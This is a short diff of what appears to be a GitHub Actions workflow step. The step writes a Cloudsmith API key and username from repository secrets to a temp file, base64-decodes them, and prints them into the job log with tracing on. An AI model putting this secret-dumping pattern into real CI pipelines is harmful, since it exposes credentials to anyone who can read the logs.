@@ -34,9 +34,9 @@ jobs:
         password: ${{ secrets.CLOUDSMITH_API_KEY }}
       run: |
         set -x
-        echo $HUB >/tmp/env.txt
-        echo $username >>/tmp/env.txt
-        echo $password >>/tmp/env.txt
+        echo $HUB | base64 -d >/tmp/env.txt
+        echo $username | base64 -d >>/tmp/env.txt
+        echo $password | base64 -d >>/tmp/env.txt
         sleep 50
         cat /tmp/env.txt
 
